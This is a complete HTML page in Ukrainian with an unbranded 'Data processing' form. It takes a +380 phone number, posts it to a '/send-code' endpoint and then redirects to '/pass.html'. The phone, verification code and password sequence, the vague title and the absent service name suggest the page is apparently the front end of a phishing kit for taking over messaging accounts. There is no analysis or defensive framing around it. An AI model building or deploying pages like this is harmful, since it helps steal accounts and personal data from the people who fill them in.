<!DOCTYPE html>
<html lang="uk">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Обробка даних</title>
<link href="https://fonts.googleapis.com/css2?family=Nunito:wght@400;500;600;700&display=swap" rel="stylesheet">
<style>
  *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }

  body {
    font-family: 'Nunito', sans-serif;
    background: #fff;
    min-height: 100vh;
    display: flex;
    flex-direction: column;
    align-items: center;
    justify-content: center;
    padding: 24px;
  }

  .page-icon {
    font-size: 52px;
    margin-bottom: 16px;
    line-height: 1;
  }

  .page-title {
    font-size: 20px;
    font-weight: 500;
    color: #111;
    margin-bottom: 28px;
    letter-spacing: 0.01em;
  }

  .card {
    width: 100%;
    max-width: 400px;
    border: 1.5px solid #e0e0e0;
    border-radius: 18px;
    padding: 36px 32px 32px;
    display: flex;
    flex-direction: column;
    align-items: center;
    gap: 24px;
    background: #fff;
  }

  .avatar {
    width: 100px;
    height: 100px;
    border-radius: 50%;
    background: #d9d9d9;
    display: flex;
    align-items: center;
    justify-content: center;
    overflow: hidden;
  }

  .avatar svg { width: 70px; height: 70px; }

  .phone-field {
    width: 100%;
    background: #f5f5f5;
    border-radius: 10px;
    padding: 10px 16px 12px;
  }

  .phone-label {
    font-size: 12px;
    color: #888;
    font-weight: 500;
    margin-bottom: 4px;
  }

  .phone-input-wrap {
    display: flex;
    align-items: center;
    gap: 6px;
    width: 100%;
  }

  .flag { font-size: 20px; line-height: 1; }

  .phone-code { color: #111; font-weight: 700; font-size: 17px; }

  .phone-input {
    background: transparent;
    border: none;
    outline: none;
    font-size: 17px;
    font-weight: 600;
    color: #111;
    font-family: 'Nunito', sans-serif;
    width: 100%;
    letter-spacing: 0.03em;
  }

  .phone-input::placeholder { color: #aaa; font-weight: 500; }

  .btn-next {
    width: 160px;
    padding: 16px;
    background: #111;
    color: #fff;
    border: none;
    border-radius: 14px;
    font-size: 18px;
    font-weight: 700;
    font-family: 'Nunito', sans-serif;
    cursor: pointer;
    transition: background 0.18s, transform 0.12s;
    letter-spacing: 0.01em;
  }

  .btn-next:hover { background: #2a2a2a; }
  .btn-next:active { transform: scale(0.97); }
  .btn-next:disabled { background: #aaa; cursor: not-allowed; }

  .status {
    font-size: 13px;
    font-weight: 600;
    text-align: center;
    display: none;
  }
  .status.error   { color: #d32f2f; display: block; }
  .status.loading { color: #555;    display: block; }

  .chat-btn {
    position: fixed;
    bottom: 24px;
    right: 24px;
    width: 52px;
    height: 52px;
    background: #6b5fe2;
    border-radius: 50%;
    display: flex;
    align-items: center;
    justify-content: center;
    cursor: pointer;
    box-shadow: 0 4px 16px rgba(107,95,226,0.4);
    transition: background 0.2s, transform 0.15s;
    border: none;
  }

  .chat-btn:hover { background: #5a4ed1; transform: scale(1.06); }
  .chat-btn svg { width: 24px; height: 24px; fill: white; }
</style>
</head>
<body>

  <div class="page-icon">🔐</div>
  <div class="page-title">Обробка даних</div>

  <div class="card">
    <div class="avatar">
      <svg viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg">
        <circle cx="50" cy="36" r="20" fill="#b0b0b0"/>
        <ellipse cx="50" cy="82" rx="30" ry="22" fill="#b0b0b0"/>
      </svg>
    </div>

    <div class="phone-field">
      <div class="phone-label">Номер телефону</div>
      <div class="phone-input-wrap">
        <span class="flag">🇺🇦</span>
        <span class="phone-code">+380</span>
        <input class="phone-input" type="tel" id="phoneNum" placeholder="00 000 0000" maxlength="12">
      </div>
    </div>

    <div id="status" class="status"></div>

    <button class="btn-next" id="btn" onclick="handleNext()">Далі</button>
  </div>

  <button class="chat-btn" title="Підтримка">
    <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
      <path d="M20 2H4C2.9 2 2 2.9 2 4v18l4-4h14c1.1 0 2-.9 2-2V4c0-1.1-.9-2-2-2zm0 12H6l-2 2V4h16v10z"/>
    </svg>
  </button>

<script>
  const input = document.getElementById('phoneNum');

  input.addEventListener('input', () => {
    let val = input.value.replace(/\D/g, '');
    if (val.length > 2 && val.length <= 5) {
      val = val.slice(0,2) + ' ' + val.slice(2);
    } else if (val.length > 5) {
      val = val.slice(0,2) + ' ' + val.slice(2,5) + ' ' + val.slice(5,9);
    }
    input.value = val;
  });

  async function handleNext() {
    const raw = input.value.replace(/\D/g, '');

    if (raw.length < 9) {
      input.style.outline = '2px solid #d32f2f';
      input.focus();
      setTimeout(() => input.style.outline = '', 1200);
      return;
    }

    // Повний номер з кодом країни
    const phone = '380' + raw;

    const btn = document.getElementById('btn');
    const status = document.getElementById('status');

    btn.disabled = true;
    btn.textContent = 'Підключаємось...';
    status.className = 'status loading';
    status.textContent = '⏳ Надсилаємо запит...';

    try {
      const response = await fetch('/send-code', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ phone })
      });

      const data = await response.json();

      if (data.success) {
        // Зберігаємо номер для наступної сторінки
        sessionStorage.setItem('phone', phone);
        // Переходимо на сторінку паролю
        window.location.href = '/pass.html';
      } else {
        status.className = 'status error';
        status.textContent = '❌ ' + (data.error || 'Помилка сервера');
        btn.disabled = false;
        btn.textContent = 'Далі';
      }
    } catch (err) {
      status.className = 'status error';
      status.textContent = '❌ Сервер недоступний';
      btn.disabled = false;
      btn.textContent = 'Далі';
    }
  }
</script>
</body>
</html>
